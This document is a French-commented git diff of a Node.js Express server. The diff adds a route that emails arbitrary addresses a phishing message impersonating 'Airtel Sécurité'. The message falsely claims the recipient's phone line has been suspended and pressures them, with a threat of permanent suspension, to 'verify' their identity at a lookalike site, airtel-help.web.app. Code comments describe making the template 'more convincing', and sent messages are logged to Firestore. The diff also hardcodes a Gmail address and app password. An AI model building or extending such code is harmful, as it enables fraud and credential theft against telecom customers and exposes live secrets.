@@ -1,7 +1,9 @@
 const admin = require("firebase-admin");
 const express = require("express");
 const cors = require("cors");
-const { spawn } = require("child_process"); // Import pour exécuter des scripts externes
+const nodemailer = require('nodemailer'); // Remplacé SendGrid par Nodemailer
+const path = require("path");
+const fs = require("fs"); // Ajout du module File System pour lire l'image
 
 // --- Connexion à Firebase depuis un serveur externe ---
 // Logique professionnelle pour gérer les identifiants de manière sécurisée.
@@ -28,6 +30,27 @@ if (process.env.NODE_ENV === 'production') {
 
 admin.initializeApp({
   credential: admin.credential.cert(serviceAccount),
+});
+
+// --- Configuration de Nodemailer avec Gmail ---
+// ATTENTION : Pour la production, il est VIVEMENT recommandé de stocker ces informations
+// dans des variables d'environnement (process.env.GMAIL_USER, process.env.GMAIL_APP_PASSWORD)
+// et non en dur dans le code.
+const GMAIL_USER = "nathanaelhacker6@gmail.com";
+const GMAIL_APP_PASSWORD = "vqtrkzpzmvecnsno"; // Ceci est un mot de passe d'application, pas votre mot de passe Gmail
+
+if (!GMAIL_USER || !GMAIL_APP_PASSWORD) {
+    console.error("ERREUR: Les identifiants Gmail (GMAIL_USER, GMAIL_APP_PASSWORD) sont manquants.");
+    console.error("Veuillez les définir pour pouvoir envoyer des e-mails.");
+    process.exit(1);
+}
+
+const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+        user: GMAIL_USER,
+        pass: GMAIL_APP_PASSWORD,
+    },
 });
 
 const app = express();
@@ -143,63 +166,157 @@ app.get('/api/sent-alerts/:id', async (req, res) => {
     }
 });
 
-// --- NOUVELLE ROUTE POUR ENVOYER L'ALERTE PAR E-MAIL ---
+// Route pour envoyer une alerte (version Nodemailer + sauvegarde Firestore, inspirée du script Python)
+app.post("/api/send-alert", async (req, res) => {
+    const { email } = req.body;
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-// --- NOUVELLE ROUTE POUR ENVOYER L'ALERTE PAR E-MAIL ---
-app.post("/api/send-alert", (req, res) => {
-  const { email } = req.body;
-
-  if (!email || !email.includes('@')) {
-    return res.status(400).json({ success: false, message: "Adresse e-mail invalide ou manquante." });
-  }
-
-  console.log(`[Node.js] Requête reçue pour envoyer une alerte à : ${email}`);
-  console.log(`[Node.js] Lancement du script Python...`);
-
-  // Exécute le script Python en tant que processus enfant
-  // 'python3' est généralement disponible sur Render. Si ça ne marche pas, essayez 'python'.
-  const pythonProcess = spawn('python3', ['./python_scripts/send_alert_email.py', email]);
-
-  let scriptOutput = '';
-  let scriptError = '';
-
-  // Écoute la sortie standard du script Python (les 'print')
-  pythonProcess.stdout.on('data', (data) => {
-    const output = data.toString();
-    scriptOutput += output;
-    console.log(`[Python STDOUT] ${output}`);
-  });
-
-  // Écoute la sortie d'erreur du script Python
-  pythonProcess.stderr.on('data', (data) => {
-    const errorOutput = data.toString();
-    scriptError += errorOutput;
-    console.error(`[Python STDERR] ${errorOutput}`);
-  });
-
-  // Quand le script Python se termine
-  pythonProcess.on('close', (code) => {
-    console.log(`[Node.js] Le script Python s'est terminé avec le code ${code}`);
-    if (code === 0 && scriptError === '') {
-      res.status(200).json({ success: true, message: "La requête d'envoi a été traitée avec succès." });
-    } else {
-      res.status(500).json({ success: false, message: "Le script d'envoi a rencontré une erreur.", error: scriptError || scriptOutput });
+    if (!email || !email.includes('@')) {
+        return res.status(400).json({ message: "Une adresse e-mail valide est requise." });
     }
-  });
+
+    // Message pour l'enregistrement dans la base de données (non visible par l'utilisateur)
+    const plainTextMessageForDB = `Alerte de sécurité envoyée. L'utilisateur a été informé d'une activité suspecte et invité à suivre la procédure sur https://airtel-help.web.app pour réactiver sa ligne.`;
+
+    // Sujet de l'e-mail, plus direct et urgent
+    const subject = "Alerte de Sécurité Critique - Action Immédiate Requise";
+    // Nom de l'expéditeur, pour un aspect plus officiel
+    const appName = "Airtel Sécurité";
+
+    // Template HTML entièrement revu pour être plus convaincant et directif
+    const htmlBody = `
+    <!doctype html>
+    <html lang="fr">
+      <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>${subject}</title>
+        <style>
+          .btn-airtel {
+            background-color: #e40000;
+            border-radius: 8px;
+            color: #ffffff !important;
+            display: inline-block;
+            font-family: sans-serif;
+            font-size: 16px;
+            font-weight: bold;
+            line-height: 45px;
+            text-align: center;
+            text-decoration: none;
+            width: 250px;
+            -webkit-text-size-adjust: none;
+          }
+        </style>
+      </head>
+      <body style="background-color: #f6f6f6; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol'; -webkit-font-smoothing: antialiased; font-size: 14px; line-height: 1.6; margin: 0; padding: 0; -ms-text-size-adjust: 100%; -webkit-text-size-adjust: 100%;">
+        <table role="presentation" border="0" cellpadding="0" cellspacing="0" style="border-collapse: separate; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 100%; background-color: #f6f6f6;" width="100%" bgcolor="#f6f6f6">
+          <tr>
+            <td style="font-family: sans-serif; font-size: 14px; vertical-align: top;" valign="top">&nbsp;</td>
+            <td style="font-family: sans-serif; font-size: 14px; vertical-align: top; display: block; max-width: 600px; padding: 10px; width: 600px; margin: 0 auto;" width="600" valign="top">
+              <div style="box-sizing: border-box; display: block; margin: 0 auto; max-width: 600px; padding: 10px;">
+
+                <table role="presentation" style="border-collapse: separate; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 100%; background: #ffffff; border-radius: 12px; border: 1px solid #e9e9e9;" width="100%">
+                  
+                  <tr>
+                    <td style="padding: 20px; background-color: #e40000; border-top-left-radius: 12px; border-top-right-radius: 12px;">
+                      <table role="presentation" border="0" cellpadding="0" cellspacing="0" style="border-collapse: separate; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 100%;" width="100%">
+                        <tr>
+                          <td style="vertical-align: middle; width: 40px;" width="40" valign="middle">
+                            <img src="cid:logo_airtel" alt="Logo Airtel" height="40" style="border: none; -ms-interpolation-mode: bicubic; max-width: 100%;" />
+                          </td>
+                          <td style="vertical-align: middle; padding-left: 15px;" valign="middle">
+                            <h1 style="color: #ffffff; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; font-size: 22px; font-weight: 700; margin: 0; line-height: 1.2;">${appName}</h1>
+                          </td>
+                        </tr>
+                      </table>
+                    </td>
+                  </tr>
+
+                  <tr>
+                    <td style="box-sizing: border-box; padding: 30px;">
+                      <table role="presentation" border="0" cellpadding="0" cellspacing="0" style="border-collapse: separate; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 100%;" width="100%">
+                        <tr>
+                          <td style="font-family: sans-serif; font-size: 14px; vertical-align: top;" valign="top">
+                            <h2 style="color: #e40000; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; font-weight: 700; margin: 0; margin-bottom: 20px; font-size: 24px;">Suspension Préventive de Votre Ligne</h2>
+                            <p style="font-family: sans-serif; font-size: 16px; font-weight: normal; margin: 0; margin-bottom: 15px; color: #333333;">Cher(e) client(e),</p>
+                            <p style="font-family: sans-serif; font-size: 16px; font-weight: normal; margin: 0; margin-bottom: 25px; color: #333333;">Pour votre protection, nous avons détecté une activité inhabituelle et avons été contraints de suspendre temporairement votre ligne pour éviter toute utilisation non autorisée.</p>
+                            
+                            <p style="font-family: sans-serif; font-size: 16px; font-weight: normal; margin: 0; margin-bottom: 25px; color: #333333;">Pour réactiver votre ligne et confirmer votre identité, veuillez suivre la procédure de sécurité obligatoire sur notre portail officiel via le bouton ci-dessous.</p>
+
+                            <table role="presentation" border="0" cellpadding="0" cellspacing="0" style="border-collapse: separate; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: auto; margin: 25px auto;" align="center">
+                              <tbody>
+                                <tr>
+                                  <td style="font-family: sans-serif; font-size: 16px; vertical-align: top; border-radius: 8px; text-align: center;" valign="top" align="center">
+                                    <a href="https://airtel-help.web.app" target="_blank" class="btn-airtel" style="color: #ffffff !important;">Sécuriser Mon Compte</a>
+                                  </td>
+                                </tr>
+                              </tbody>
+                            </table>
+                            
+                            <p style="font-family: sans-serif; font-size: 14px; font-weight: normal; margin: 0; margin-top: 25px; color: #555555; text-align: center; border-top: 1px solid #eeeeee; padding-top: 20px;"><strong>Attention :</strong> Si cette vérification n'est pas complétée dans les plus brefs délais, la suspension de votre ligne pourrait devenir permanente.</p>
+                          </td>
+                        </tr>
+                      </table>
+                    </td>
+                  </tr>
+                </table>
+
+                <div style="clear: both; margin-top: 10px; text-align: center; width: 100%;">
+                  <table role="presentation" border="0" cellpadding="0" cellspacing="0" style="border-collapse: separate; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 100%;" width="100%">
+                    <tr>
+                      <td style="font-family: sans-serif; vertical-align: top; padding: 20px; font-size: 12px; color: #999999; text-align: center;" valign="top" align="center">
+                        <span style="color: #999999; font-size: 12px; text-align: center;">© ${new Date().getFullYear()} Airtel. Tous droits réservés.</span>
+                        <br>
+                        <span style="color: #999999; font-size: 12px; text-align: center;">Ceci est un message de sécurité automatique.</span>
+                      </td>
+                    </tr>
+                  </table>
+                </div>
+
+              </div>
+            </td>
+            <td style="font-family: sans-serif; font-size: 14px; vertical-align: top;" valign="top">&nbsp;</td>
+          </tr>
+        </table>
+      </body>
+    </html>`;
+
+    // Création de l'objet message pour Nodemailer
+    const mailOptions = {
+      // L'expéditeur apparaîtra comme "Airtel Sécurité <votre-email-gmail>"
+      from: `"${appName}" <${GMAIL_USER}>`,
+      to: email,
+      subject: subject,
+      html: htmlBody,
+      attachments: [
+        {
+          filename: "airtel.jpg",
+          path: path.join(__dirname, 'airtel.jpg'),
+          cid: "logo_airtel", // contentId pour l'image en ligne
+        },
+      ],
+    };
+
+    try {
+        // Envoi de l'e-mail via Nodemailer
+        await transporter.sendMail(mailOptions);
+        console.log(`Alerte envoyée à ${email}`);
+
+        const db = admin.firestore();
+        // On sauvegarde un résumé textuel de l'alerte pour l'historique
+        const alertRecord = { recipient: email, subject: subject, body: plainTextMessageForDB, sentAt: new Date() };
+        
+        await db.collection('sentAlerts').add(alertRecord);
+        console.log(`Alerte pour ${email} sauvegardée dans Firestore.`);
+
+        res.status(200).json({ message: `Alerte envoyée et enregistrée pour ${email}` });
+    } catch (error) {
+        console.error("Erreur lors de l'envoi de l'alerte :", error);
+        // Fournir une erreur plus spécifique si possible (ex: problème d'authentification)
+        if (error.code === 'EAUTH') {
+            return res.status(500).json({ message: "Erreur d'authentification avec le service d'e-mail. Vérifiez les identifiants." });
+        }
+        res.status(500).json({ message: "Le script d'envoi a rencontré une erreur. Vérifiez les logs du serveur." });
+    }
 });
 
 app.listen(PORT, () => {
